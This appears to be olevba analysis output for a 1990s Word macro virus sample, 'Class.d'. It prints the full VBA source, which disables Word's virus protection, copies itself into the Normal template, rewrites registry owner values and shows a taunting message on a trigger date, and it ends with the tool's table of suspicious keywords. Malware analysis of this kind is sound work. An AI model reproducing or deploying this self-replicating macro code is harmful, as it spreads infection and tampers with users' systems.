olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-5612ae7b4f0f790ca1dfcd5a3ae06b3b5d311356
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-5612ae7b4f0f790ca1dfcd5a3ae06b3b5d311356 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
Const REG_SZ As Long = 1
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
Const HKEY_CURRENT_USER As Long = &H80000001
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
Sub AutoOpen()
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
On Error GoTo out
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
Options.VirusProtection = False
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
Options.SaveNormalPrompt = False
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
Options.ConfirmConversions = False
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
If nt > 70 And ad > 0 Then GoTo out
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
If nt < 70 Then
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
End If
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
host.codemodule.AddFromFile ("c:\class.sys")
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
With host.codemodule
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
    For x = 1 To 16
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
    .deletelines 1
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
    Next x
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
End With
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
If nt < 70 Then
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
    With host.codemodule
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
    .replaceline 1, "Sub AutoClose()"
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
    .replaceline 91, "Sub ToolsMacro()"
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
    For x = 70 To 81
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
        .deletelines 62
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
    Next x
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
    .replaceline 35, "    For x = 1 To 4"
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
    End With
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
End If
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
If nt < 70 Then
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
u = RegCloseKey(k)
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
End If
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
With host.codemodule
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
    For x = 2 To 104 Step 2
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
    Next x
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
End With
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
out:
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
End Sub
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
Sub ViewVBCode()
'Mr Vanderberg10/28/98 10:26:07 AMHP DeskJet 690C Series v11.0 on LPT1:davidhistory
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

